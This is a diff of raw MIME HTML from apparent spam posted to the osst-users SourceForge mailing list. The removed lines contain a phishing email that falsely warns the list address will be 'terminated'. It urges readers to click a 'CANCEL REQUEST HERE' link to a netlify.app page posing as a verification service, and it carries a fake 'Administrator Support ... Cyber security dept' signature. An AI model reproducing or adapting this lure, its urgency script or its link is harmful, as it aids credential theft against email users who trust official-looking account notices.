-s@lists.sourceforge.net</SPAN></TD></TR>
-<TR>
-<TH align=3Dleft><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px">Time&nbsp;&=
-nbsp;&nbsp;&nbsp; :</SPAN></TH>
-<td align=3D"left"><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px">2/7/2022 =
-12:33:59 a.m.</SPAN></TD></TR></TBODY></TABLE>
-<DIV dir=3Dltr><SPAN class=3Dv1size style=3D"FONT-SIZE: 10px"><SPAN><SPAN c=
-lass=3Dv1size style=3D"FONT-SIZE: 13px"><SPAN><SPAN class=3Dv1size style=3D=
-"FONT-SIZE: 10px"><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px"><FONT size=
-=3D3><BR>&nbsp;</FONT><A style=3D"COLOR: rgb(0,105,166)" href=3D"https://jo=
-lly-lalande-05ed13-supportverify-servre-update.netlify.app/index.html#osst-=
-users@lists.sourceforge.net" rel=3Dnoreferrer target=3D_blank><STRONG><FONT=
- size=3D3>CANCEL REQUEST&nbsp;HERE<SPAN>&nbsp;</SPAN></FONT></STRONG></A><F=
-ONT size=3D3> </FONT>
-<A style=3D"COLOR: rgb(0,105,166)" href=3D"https://jolly-lalande-05ed13-sup=
-portverify-servre-update.netlify.app/index.html#osst-users@lists.sourceforg=
-e.net" rel=3Dnoreferrer target=3D_blank><STRONG><FONT size=3D3>&#9654;</FON=
-T></STRONG></A><STRONG><FONT size=3D3>&nbsp;&nbsp;</FONT>&nbsp;</STRONG></S=
-PAN></SPAN></SPAN><BR><BR>
-If you did not make this request or you made it by mistake or unknowingly, =
-quickly take action above&nbsp;to stop this email termination process, but =
-if you made this request kindly ignore this message as this account will be=
- terminated soon.</SPAN></SPAN></SPAN></DIV></TD></TR>
-<TR>
-<td>
-<DIV style=3D"FONT-SIZE: 12px; BORDER-TOP: rgb(232,232,232) 2px solid; MARG=
-IN-TOP: 5px; COLOR: rgb(102,102,102); PADDING-TOP: 5px">
-<DIV style=3D"BORDER-TOP: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDI=
-NG-LEFT: 0px; MARGIN: 5px 0px 0px; PADDING-RIGHT: 0px" dir=3Dltr><SPAN><SPA=
-N class=3Dv1size style=3D"FONT-SIZE: 10px"><SPAN class=3Dv1size style=3D"FO=
-NT-SIZE: 13px"><STRONG><BR></STRONG></SPAN></SPAN></SPAN><BR></DIV>
-<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
-GIN: 5px 0px 0px; PADDING-RIGHT: 0px"><SPAN class=3Dv1size style=3D"FONT-SI=
-ZE: 13px"><B><SPAN class=3Dv1colour style=3D"COLOR: rgb(204,0,0)">Note:<SPA=
-N>&nbsp;</SPAN></SPAN></B><SPAN class=3Dv1colour style=3D"COLOR: rgb(0,0,25=
-5)"> If you fail to cancel this process above, we advise you to backup your=
- mails and contacts as you will lose all your messages and contacts when th=
-is email "osst-users@lists.sourceforge.net" account termination is conclude=
-d.</SPAN>
- </SPAN><BR></DIV></DIV>
-<DIV dir=3Dltr><SPAN class=3Dv1size style=3D"FONT-SIZE: 10px"><SPAN>&copy;l=
-ists.sourceforge.net</SPAN></SPAN><BR></DIV></TD></TR></TBODY></TABLE></TD>=
-
-<td width=3D"15"><BR></TD></TR></TBODY></TABLE></TD></TR>
-<TR>
-<td style=3D"PADDING-TOP: 10px" align=3D"center"><SPAN class=3Dv1size style=
-=3D"FONT-SIZE: 10px"><SPAN><SPAN class=3Dv1size style=3D"FONT-SIZE: 13px"><=
-FONT size=3D1>Source: Administrator Support &copy;2022 Cyber security dept<=
-/FONT></SPAN></SPAN></SPAN><BR></TD></TR></TBODY></TABLE></DIV></TD></TR>
-<TR>
-<td style=3D"FONT-SIZE: 16px; FONT-FAMILY: &quot;segoe ui&quot;, frutiger, =
-arial, sans-serif; PADDING-BOTTOM: 6px; PADDING-TOP: 0px; PADDING-LEFT: 10p=
-x; PADDING-RIGHT: 10px"></TD></TR>
-<TR>
-<td style=3D"FONT-SIZE: 16px; FONT-FAMILY: &quot;segoe ui&quot;, frutiger, =
-arial, sans-serif; PADDING-BOTTOM: 6px; PADDING-TOP: 0px; PADDING-LEFT: 10p=
-x; PADDING-RIGHT: 10px"></TD></TR></TBODY></TABLE></TD></TR>
-<TR>
-<td style=3D"FONT-SIZE: 14px; FONT-FAMILY: &quot;segoe ui&quot;, frutiger, =
-arial, sans-serif; PADDING-BOTTOM: 4px; PADDING-TOP: 10px"></TD></TR></TBOD=
-Y></TABLE>
-<P style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Lucida Grande", Verdana, Arial, =
-Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFO=
-RM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FONT-STYLE: normal; ORPHA=
-NS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255=
-); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: nor=
-mal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; te=
-xt-decoration-style: initial;=20
-text-decoration-color: initial'></P>
-<DIV style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Lucida Grande", Verdana, Arial=
-, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
-FORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FONT-STYLE: normal; ORP=
-HANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,2=
-55); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: n=
-ormal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; =
-text-decoration-style: initial;=20
-text-decoration-color: initial'><SPAN class=3Dv1font style=3D'FONT-FAMILY: =
-"Segoe UI", "Lucida Sans", sans-serif'><SPAN class=3Dv1colour style=3D"COLO=
-R: rgb(153,153,153)"><SPAN class=3Dv1size style=3D"FONT-SIZE: 10px">
-The information contained in or attached to this communication is intended =
-solely for the use of the individual or entity to whom it is addressed and =
-others authorized to receive it. It may contain confidential or legally pri=
-vileged information. If you are not the intended recipient you are hereby n=
-otified that any disclosure, copying, distribution or taking any action in =
-reliance on the contents of this information is strictly prohibited and may=
- be unlawful. If you have received this=20
-communication in error, please notify me immediately by responding to this =
-email and then delete it from your system. We are neither liable for the pr=
-oper and complete transmission of the information contained in this communi=
-cation nor for any delay in its receipt.</SPAN>&nbsp;</SPAN></SPAN></DIV></=
-BODY></HTML>
+<DIV class=3Dgmail-v1gmail-hi style=3D"FONT-SIZE: medium; WIDTH: auto; BACK=
+GROUND: rgb(242,242,242); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LE=
+FT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; border-bottom-left-radius: 1px; b=
+order-bottom-right-radius: 1px"></DIV></DIV></DIV>
+<DIV class=3Dgmail-v1gmail-ajx style=3D"FONT-SIZE: medium; CLEAR: both"><BR=
+></DIV></DIV>
+<DIV class=3D"gmail-v1gmail-gA gmail-v1gmail-gt gmail-v1gmail-acV" style=3D=
+"FONT-SIZE: 11px; BORDER-TOP: medium none; FONT-FAMILY: Roboto, RobotoDraft=
+, Helvetica, Arial, sans-serif; WIDTH: auto; COLOR: rgb(51,51,51); PADDING-=
+BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGH=
+T: 0px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; ba=
+ckground-size: initial; background-origin: initial; background-clip: initia=
+l">
+<DIV class=3D"gmail-v1gmail-gB gmail-v1gmail-xu" style=3D"BORDER-TOP: 0px; =
+PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0p=
+x"></DIV></DIV></BODY></HTML>
 
 
---===============0321783585826778530==
+--===============6791416228095201819==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
---===============0321783585826778530==
+--===============6791416228095201819==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -363,4 +229,4 @@ Osst-users mailing list
 Osst-users@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/osst-users
 
---===============0321783585826778530==--
+--===============6791416228095201819==--
